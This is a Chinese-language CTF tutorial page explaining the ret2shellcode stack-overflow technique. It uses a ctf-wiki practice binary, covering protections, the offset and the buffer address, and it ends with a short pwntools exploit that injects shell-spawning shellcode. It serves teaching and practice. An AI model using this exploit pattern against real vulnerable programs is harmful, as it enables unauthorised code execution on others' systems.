<template><div><p><a name="b6724cff"></a></p>
<h2 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h2>
<p>ret2shellcode，当程序当中没有system函数时，我们需要自己往栈上写入一段shellcode，然后控制eip使其指向shellcode的地址。</p>
<p><strong>shellcode</strong> 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的程序在运行时，shellcode 所在的区域具有可执行权限。即必须关闭堆栈不可执行功能。<br /><img src="https://img-blog.csdnimg.cn/20210221153712915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=bPkJ5&amp;originHeight=386&amp;originWidth=728&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p><a name="039336d4"></a></p>
<h2 id="例题-来自ctfwiki" tabindex="-1"><a class="header-anchor" href="#例题-来自ctfwiki" aria-hidden="true">#</a> 例题（来自ctfwiki）：</h2>
<p><a name="562b019f"></a></p>
<h3 id="首先checksec" tabindex="-1"><a class="header-anchor" href="#首先checksec" aria-hidden="true">#</a> 首先checksec：</h3>
<p><img src="https://img-blog.csdnimg.cn/20210221153736960.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=o1F0N&amp;originHeight=165&amp;originWidth=376&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />发现程序没有开启任何保护，并且存在可读可写可执行段。</p>
<p><a name="d8a8823b"></a></p>
<h3 id="然后ida32打开" tabindex="-1"><a class="header-anchor" href="#然后ida32打开" aria-hidden="true">#</a> 然后ida32打开：</h3>
<p><img src="https://img-blog.csdnimg.cn/2021022115385818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=M9jEX&amp;originHeight=271&amp;originWidth=690&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy">首先观察到程序没有system函数，并且存在可读可写可执行段，存在栈溢出漏洞，考虑是ret2shellcode。<br />程序逻辑非常简单，通过gets函数读入数据给v4，然后再将v4的值复制到buf2中，而buf2正好处于可读可写可执行段中，所以shellcode的地址应该是buf2的地址。</p>
<p><img src="https://img-blog.csdnimg.cn/202102211539177.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=SsAxY&amp;originHeight=133&amp;originWidth=804&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>通过cyclic确定需要填入的垃圾数据大小为112。</p>
<p><a name="4f7d0e2b"></a></p>
<h3 id="思路" tabindex="-1"><a class="header-anchor" href="#思路" aria-hidden="true">#</a> 思路：</h3>
<p>首先向程序中写入shellcode，然后再填入垃圾数据，<strong>shellcode和垃圾数据的大小之和为112</strong>，可使用ljust方法，然后写入返回地址，程序写入后会被复制到buf2中，buf2的地址为0x804a080。</p>
<p><a name="a3e6be45"></a></p>
<h3 id="exp" tabindex="-1"><a class="header-anchor" href="#exp" aria-hidden="true">#</a> exp：</h3>
<div class="language-python ext-py line-numbers-mode"><pre v-pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#生成shellcode</span>
buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#先写入shellcode，剩余位置用A补齐</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div></template>


